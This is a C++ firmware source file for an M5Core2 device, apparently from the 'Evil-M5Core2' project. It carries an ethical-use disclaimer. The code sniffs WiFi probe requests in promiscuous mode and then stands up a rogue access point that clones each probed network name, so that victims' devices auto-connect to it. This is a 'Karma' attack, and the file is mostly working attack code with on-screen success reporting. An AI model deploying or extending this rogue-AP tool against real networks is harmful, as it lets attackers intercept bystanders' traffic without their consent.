/*
   Evil-M5Core2 - WiFi Network Testing and Exploration Tool

   Copyright (c) 2024 7h30th3r0n3

   Permission is hereby granted, free of charge, to any person obtaining a copy
   of this software and associated documentation files (the "Software"), to deal
   in the Software without restriction, including without limitation the rights
   to use, copy, modify, merge, publish, distribute, sublicense, and/or sell
   copies of the Software, and to permit persons to whom the Software is
   furnished to do so, subject to the following conditions:

   The above copyright notice and this permission notice shall be included in all
   copies or substantial portions of the Software.

   THE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR
   IMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,
   FITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE
   AUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER
   LIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,
   OUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE
   SOFTWARE.

   Disclaimer:
   This tool, Evil-M5Core2, is developed for educational and ethical testing purposes only. 
   Any misuse or illegal use of this tool is strictly prohibited. The creator of Evil-M5Core2 
   assumes no liability and is not responsible for any misuse or damage caused by this tool. 
   Users are required to comply with all applicable laws and regulations in their jurisdiction 
   regarding network testing and ethical hacking.
*/
#include <LittleFS.h>
#include <M5Unified.h>
#include <Avatar.h>
#include <Wire.h>
#include <WiFi.h>
#include <WebServer.h>
#include <DNSServer.h>
extern "C" {
  #include "esp_wifi.h"
  #include "esp_system.h"
}

using namespace m5avatar;
Avatar avatar;
bool isAvatarActive = true;
unsigned long angryExpressionStartTime = 0;
unsigned long lastExpressionChangeTime = 0;
const unsigned long angryDuration = 3000;
const unsigned long expressionDuration = 20000;

const Expression expressions[] = {
  Expression::Sleepy,
  Expression::Happy,
  Expression::Sad,
  Expression::Doubt,
  Expression::Neutral
};
const int expressionsSize = sizeof(expressions) / sizeof(Expression);

float scale = 0.5f; 
int8_t position_top = 0;
int8_t position_left = -40;
uint8_t display_rotation = 0;

Face* faces[4];

char SpeechTextKarama[64] = "";
char currentSpeechText[64] = "";

char lastSSID[33] = {0};
char lastDeployedSSID[33] = {0};
bool newSSIDAvailable = false;
bool isAPDeploying = false;
bool isWaitingForProbeDisplayed = false;
unsigned long lastProbeDisplayUpdate = 0;
int probeDisplayState = 0;
bool isInitialDisplayDone = false;
std::vector<std::string> whitelist = {"neighbours-box", "7h30th3r0n3", "Evil-M5Core2"};
char captivePortalPassword[64] = "";
char clonedSSID[33] = "Evil-M5Dial";
const int autoKarmaAPDuration = 20000;
bool isAutoKarmaActive = false;

enum DisplayState {
    DISPLAY_NONE,
    DISPLAY_WAITING_FOR_PROBE,
    DISPLAY_AP_STATUS
};

DisplayState currentDisplayState = DISPLAY_NONE;

void stopAvatar() {
    if (isAvatarActive) {
        avatar.stop();
        isAvatarActive = false;
    }
}

void startAvatar() {
    if (!isAvatarActive) {
        avatar.start();
        isAvatarActive = true;
    }
}

void setup() {
    auto cfg = M5.config();
    M5.begin(cfg);

    if (!LittleFS.begin(true)) {
        Serial.println("An Error has occurred while mounting LittleFS");
        return;
    }

    const char* imagePath = "/EvilM5hub-240-135px.bmp";

    if (LittleFS.exists(imagePath)) {
        Serial.println("Image file found, displaying image.");

        int16_t x_center = (M5.Display.width() - 240) / 2;
        int16_t y_center = (M5.Display.height() - 135) / 2; 

        M5.Display.setRotation(display_rotation);
        M5.Display.clear();
        M5.Display.drawBmpFile(LittleFS, imagePath, x_center, y_center); 

        delay(5000);

        M5.Display.clear();
    } else {
        Serial.println("Image file not found, skipping image display.");
    }

    faces[0] = avatar.getFace();
    avatar.setScale(scale);
    avatar.setPosition(position_top, position_left);
    avatar.init();
    isAvatarActive = true;

    esp_wifi_set_promiscuous(false);
    Serial.begin(115200);
    Serial.println("Setup complete");
}

void loop() {
    M5.update();
    WiFi.mode(WIFI_STA);

    if (!isAutoKarmaActive && isAvatarActive) {
        if (SpeechTextKarama[0] != '\0') {
            if (strcmp(SpeechTextKarama, currentSpeechText) != 0) {
                Serial.println("Setting avatar speech text.");
                avatar.setMouthOpenRatio(0.2f);
                avatar.setSpeechText(SpeechTextKarama);
                strcpy(currentSpeechText, SpeechTextKarama);
                Serial.printf("SpeechTextKarama is not empty: %s, setting mouth open.\n", SpeechTextKarama);
            }
        } else if (currentSpeechText[0] != '\0') {
            avatar.setMouthOpenRatio(0.0f);
            avatar.setSpeechText("");
            currentSpeechText[0] = '\0';
            Serial.println("SpeechTextKarama is empty or invalid.");
        }

        if (millis() - angryExpressionStartTime > angryDuration) {
            if (millis() - lastExpressionChangeTime > expressionDuration) {
                int randomExpressionIndex = random(expressionsSize);
                if (avatar.getExpression() != expressions[randomExpressionIndex]) {
                    Serial.printf("Changing expression to index: %d\n", randomExpressionIndex);
                    avatar.setExpression(expressions[randomExpressionIndex]);
                    lastExpressionChangeTime = millis();
                }
            }
        }
    }

    if (M5.BtnA.wasPressed()) {
        Serial.println("Button A was pressed.");
        if (isAutoKarmaActive) {
            Serial.println("Stopping AutoKarma");
            stopAutoKarma();
        } else {
            Serial.println("Starting AutoKarma");
            startAutoKarma();
        }
    }

    delay(33);
}

void createCaptivePortal() {
    const char* ssid = (strlen(clonedSSID) > 0) ? clonedSSID : "Evil-M5Core2";
    WiFi.mode(WIFI_MODE_APSTA);
    if (!isAutoKarmaActive) {
        if (strlen(captivePortalPassword) == 0) {
            WiFi.softAP(ssid);
        } else {
            WiFi.softAP(ssid, captivePortalPassword);
        }
        Serial.printf("Captive portal created with SSID: %s\n", ssid);
    }
}

void drawRing(uint16_t color) {
    int16_t centerX = M5.Display.width() / 2;
    int16_t centerY = M5.Display.height() / 2;
    int16_t radius = min(M5.Display.width(), M5.Display.height()) / 2;

    for (int16_t r = radius; r > radius - 10; r--) {
        M5.Display.drawCircle(centerX, centerY, r, color);
    }
}

void startAutoKarma() {
    isAutoKarmaActive = true;

    angryExpressionStartTime = 0;
    lastExpressionChangeTime = 0;

    stopAvatar();

    M5.Display.clear();

    M5.Display.setRotation(display_rotation);
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(TFT_WHITE);
    int16_t startTextX = (M5.Display.width() - M5.Display.textWidth("Starting Karma Attack...")) / 1.5;
    int16_t startTextY = M5.Display.height() / 2;
    M5.Display.setCursor(startTextX, startTextY);
    M5.Display.println("Starting Karma Attack...");

    Serial.println("-------------------");
    Serial.println("Karma Auto Attack Started....");
    Serial.println("-------------------");

    esp_wifi_set_promiscuous(false);
    esp_wifi_stop();
    esp_wifi_deinit();
    delay(300);

    wifi_init_config_t cfg = WIFI_INIT_CONFIG_DEFAULT();
    if (esp_wifi_init(&cfg) != ESP_OK) {
        Serial.println("Failed to initialize WiFi!");
        M5.Display.clear();
        M5.Display.setCursor(startTextX, startTextY);
        M5.Display.setTextSize(1.5);
        M5.Display.println("Failed to initialize WiFi!");
        delay(2000);
        isAutoKarmaActive = false;
        return;
    }
    if (esp_wifi_start() != ESP_OK) {
        Serial.println("Failed to start WiFi!");
        M5.Display.clear();
        M5.Display.setCursor(startTextX, startTextY);
        M5.Display.setTextSize(1.5);
        M5.Display.println("Failed to start WiFi!");
        delay(2000);
        isAutoKarmaActive = false;
        return;
    }
    if (esp_wifi_set_promiscuous(true) != ESP_OK) {
        Serial.println("Failed to set promiscuous mode!");
        M5.Display.clear();
        M5.Display.setCursor(startTextX, startTextY);
        M5.Display.setTextSize(1.5);
        M5.Display.println("Failed to set promiscuous mode!");
        delay(2000);
        isAutoKarmaActive = false;
        return;
    }
    esp_wifi_set_promiscuous_rx_cb(&autoKarmaPacketSniffer);

    createCaptivePortal();
    loopAutoKarma();
    esp_wifi_set_promiscuous(false);
}

void stopAutoKarma() {
    isAPDeploying = false;
    isAutoKarmaActive = false;
    isInitialDisplayDone = false;
    memset(lastSSID, 0, sizeof(lastSSID));
    memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
    newSSIDAvailable = false;
    esp_wifi_set_promiscuous(false);
    Serial.println("-------------------");
    Serial.println("Karma Auto Attack Stopped....");
    Serial.println("-------------------");

    startAvatar();
    angryExpressionStartTime = millis();
    lastExpressionChangeTime = millis();
}

void autoKarmaPacketSniffer(void* buf, wifi_promiscuous_pkt_type_t type) {
    if (type != WIFI_PKT_MGMT || isAPDeploying) return;

    const wifi_promiscuous_pkt_t *packet = (wifi_promiscuous_pkt_t*)buf;
    const uint8_t *frame = packet->payload;
    const uint8_t frame_type = frame[0];

    if (frame_type == 0x40) {
        uint8_t ssid_length_Karma_Auto = frame[25];
        if (ssid_length_Karma_Auto > 0 && ssid_length_Karma_Auto <= 32) {
            char tempSSID[33];
            memset(tempSSID, 0, sizeof(tempSSID));
            strncpy(tempSSID, (char*)&frame[26], ssid_length_Karma_Auto);
            tempSSID[ssid_length_Karma_Auto] = '\0';
            strncpy(lastSSID, tempSSID, sizeof(lastSSID) - 1);
            newSSIDAvailable = true;
            Serial.printf("New SSID detected: %s\n", lastSSID);
        } else {
            Serial.printf("Invalid SSID length detected: %d\n", ssid_length_Karma_Auto);
        }
    }
}

void loopAutoKarma() {
    while (isAutoKarmaActive) {
        M5.update();

        if (M5.BtnA.wasPressed()) {
            stopAutoKarma();
            return;
        }

        if (newSSIDAvailable) {
            newSSIDAvailable = false;
            activateAPForAutoKarma(lastSSID);
            isWaitingForProbeDisplayed = false;
        } else {
            if (!isWaitingForProbeDisplayed || (millis() - lastProbeDisplayUpdate > 1000)) {
                displayWaitingForProbe();
                Serial.println("-------------------");
                Serial.println("Waiting for probe....");
                Serial.println("-------------------");
                isWaitingForProbeDisplayed = true;
                lastProbeDisplayUpdate = millis();
            }
        }

        delay(100);
    }

    memset(lastSSID, 0, sizeof(lastSSID));
    newSSIDAvailable = false;
    isWaitingForProbeDisplayed = false;
    isInitialDisplayDone = false;
}

bool isSSIDWhitelisted(const char* ssid) {
    for (const auto& wssid : whitelist) {
        if (wssid == ssid) {
            return true;
        }
    }
    return false;
}

void activateAPForAutoKarma(const char* ssid) {
    if (isSSIDWhitelisted(ssid)) {
        Serial.println("-------------------");
        Serial.println("SSID in the whitelist, skipping : " + String(ssid));
        Serial.println("-------------------");
        return;
    }
    if (strcmp(ssid, lastDeployedSSID) == 0) {
        Serial.println("-------------------");
        Serial.println("Skipping already deployed probe : " + String(lastDeployedSSID));
        Serial.println("-------------------");
        return;
    }

    isAPDeploying = true;
    isInitialDisplayDone = false;

    if (strlen(captivePortalPassword) == 0) {
        WiFi.softAP(ssid);
    } else {
        WiFi.softAP(ssid, captivePortalPassword);
    }

    DNSServer dnsServer;
    WebServer server(80);

    Serial.println("-------------------");
    Serial.println("Starting Karma AP for : " + String(ssid));
    Serial.println("Time :" + String(autoKarmaAPDuration / 1000) + " s");
    Serial.println("-------------------");
    unsigned long startTime = millis();

    while (millis() - startTime < autoKarmaAPDuration) {
        displayAPStatus(ssid, startTime, autoKarmaAPDuration);
        dnsServer.processNextRequest();
        server.handleClient();

        M5.update();

        if (M5.BtnA.wasPressed()) {
            memset(lastDeployedSSID, 0, sizeof(lastDeployedSSID));
            break;
        }

        int clientCount = WiFi.softAPgetStationNum();
        if (clientCount > 0) {
            if (!isAutoKarmaActive) {
                strncpy(SpeechTextKarama, ssid, sizeof(SpeechTextKarama) - 1);
            }
            strncpy(clonedSSID, ssid, sizeof(clonedSSID) - 1);
            isAPDeploying = false;
            isAutoKarmaActive = false;
            isInitialDisplayDone = false;

            Serial.println("-------------------");
            Serial.println("Karma Successful for : " + String(clonedSSID));
            Serial.println("-------------------");

            memset(lastSSID, 0, sizeof(lastSSID));
            newSSIDAvailable = false;

            M5.Display.clear();
            drawRing(TFT_GREEN);

            int textSize = 2;
            M5.Display.setTextSize(textSize);
            while (M5.Display.textWidth("Karma Successful!") > M5.Display.width() && textSize > 1.5) {
                textSize--;
                M5.Display.setTextSize(textSize);
            }

            int16_t successTextX = (M5.Display.width() - M5.Display.textWidth("Karma Successful!")) / 2;
            int16_t successTextY = M5.Display.height() / 2;
            M5.Display.setCursor(successTextX, successTextY);
            M5.Display.println("Karma Successful!");

            textSize = 1.5;
            M5.Display.setTextSize(textSize);
            while (M5.Display.textWidth(clonedSSID) > M5.Display.width() && textSize > 1.5) {
                textSize--;
                M5.Display.setTextSize(textSize);
            }

            int16_t ssidTextX = (M5.Display.width() - M5.Display.textWidth(clonedSSID)) / 2;
            int16_t ssidTextY = (M5.Display.height() / 2 + 20);
            M5.Display.setCursor(ssidTextX, ssidTextY);
            M5.Display.println("On: " + String(clonedSSID));

            delay(7000);
            WiFi.softAPdisconnect(true);
            return;
        }

        delay(100);
    }

    strncpy(lastDeployedSSID, ssid, sizeof(lastDeployedSSID) - 1.5);

    WiFi.softAPdisconnect(true);
    isAPDeploying = false;
    isWaitingForProbeDisplayed = false;
    newSSIDAvailable = false;
    isInitialDisplayDone = false;

    Serial.println("-------------------");
    Serial.println("Karma Failed for : " + String(ssid));
    Serial.println("-------------------");

    M5.Display.clear();
    drawRing(TFT_RED);

    int textSize = 2;
    M5.Display.setTextSize(textSize);
    while (M5.Display.textWidth("Karma Failed") > M5.Display.width() && textSize > 1.5) {
        textSize--;
        M5.Display.setTextSize(textSize);
    }

    int16_t failTextX = (M5.Display.width() - M5.Display.textWidth("Karma Failed")) / 2;
    int16_t failTextY = M5.Display.height() / 2 - 10;
    M5.Display.setCursor(failTextX, failTextY);
    M5.Display.println("Karma Failed");

    textSize = 1.5;
    M5.Display.setTextSize(textSize);
    while (M5.Display.textWidth(ssid) > M5.Display.width() && textSize > 1.5) {
        textSize--;
        M5.Display.setTextSize(textSize);
    }

    int16_t ssidFailTextX = (M5.Display.width() - M5.Display.textWidth(ssid)) / 2;
    int16_t ssidFailTextY = (M5.Display.height() / 2 + 20);
    M5.Display.setCursor(ssidFailTextX, ssidFailTextY);
    M5.Display.println("On: " + String(ssid));

    delay(2000);

    isAPDeploying = false;
    isInitialDisplayDone = false;
    currentDisplayState = DISPLAY_WAITING_FOR_PROBE;
    
    M5.Display.fillScreen(TFT_BLACK);
    displayWaitingForProbe();
}

void displayWaitingForProbe() {
    if (currentDisplayState != DISPLAY_WAITING_FOR_PROBE) {
        M5.Display.fillScreen(TFT_BLACK);
        currentDisplayState = DISPLAY_WAITING_FOR_PROBE;
    }

    M5.Display.setRotation(display_rotation);
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(TFT_WHITE);

    int16_t waitingTextX = (M5.Display.width() - M5.Display.textWidth("Waiting for probe")) / 2;
    int16_t waitingTextY = M5.Display.height() / 2 - 30;
    M5.Display.setCursor(waitingTextX, waitingTextY);
    M5.Display.print("Waiting for probe");

    unsigned long currentTime = millis();
    if (currentTime - lastProbeDisplayUpdate > 1000) {
        lastProbeDisplayUpdate = currentTime;
        probeDisplayState = (probeDisplayState + 1) % 4;

        int16_t dotsX = waitingTextX + M5.Display.textWidth("Waiting for probe");
        int16_t dotsY = waitingTextY;

        M5.Display.fillRect(dotsX, dotsY, M5.Display.textWidth("..."), M5.Display.fontHeight(), TFT_BLACK);

        M5.Display.setCursor(dotsX, dotsY);
        for (int i = 0; i < probeDisplayState; i++) {
            M5.Display.print(".");
        }
    }

    int16_t rectHeight = M5.Display.height() / 2;
    M5.Display.fillRect(0, M5.Display.height() - rectHeight, M5.Display.width(), rectHeight, TFT_RED);

    int16_t stopTextX = (M5.Display.width() - M5.Display.textWidth("Stop Auto")) / 2;
    int16_t stopTextY = M5.Display.height() - rectHeight / 2 - M5.Display.fontHeight() / 2;
    M5.Display.setTextColor(TFT_BLACK);
    M5.Display.setCursor(stopTextX, stopTextY);
    M5.Display.println("Stop Auto");
}

void displayAPStatus(const char* ssid, unsigned long startTime, int autoKarmaAPDuration) {
    if (currentDisplayState != DISPLAY_AP_STATUS) {
        M5.Display.clear();
        currentDisplayState = DISPLAY_AP_STATUS;
    }

    unsigned long currentTime = millis();
    int remainingTime = autoKarmaAPDuration / 1000 - ((currentTime - startTime) / 1000);
    int clientCount = WiFi.softAPgetStationNum();

    M5.Display.setRotation(display_rotation);
    M5.Display.setTextSize(1.5);
    M5.Display.setTextColor(TFT_WHITE);

    M5.Display.fillScreen(TFT_BLACK);

    int16_t x = (M5.Display.width() - M5.Display.textWidth(ssid)) / 2;
    int16_t y = M5.Display.height() / 4;
    M5.Display.setCursor(x, y);
    M5.Display.println(ssid);

    String timeText = "Time: " + String(remainingTime) + "s";
    x = (M5.Display.width() - M5.Display.textWidth(timeText)) / 2;
    y = M5.Display.height() / 2;
    M5.Display.setCursor(x, y);
    M5.Display.println(timeText);

    String clientText = "Clients: " + String(clientCount);
    x = (M5.Display.width() - M5.Display.textWidth(clientText)) / 2;
    y = (3 * M5.Display.height() / 4);
    M5.Display.setCursor(x, y);
    M5.Display.println(clientText);

    String stopText = "Press to Stop";
    M5.Display.setTextSize(1);
    int16_t stopTextX = (M5.Display.width() - M5.Display.textWidth(stopText)) / 2;
    int16_t stopTextY = M5.Display.height() - 30;
    M5.Display.setCursor(stopTextX, stopTextY);
    M5.Display.println(stopText);
}
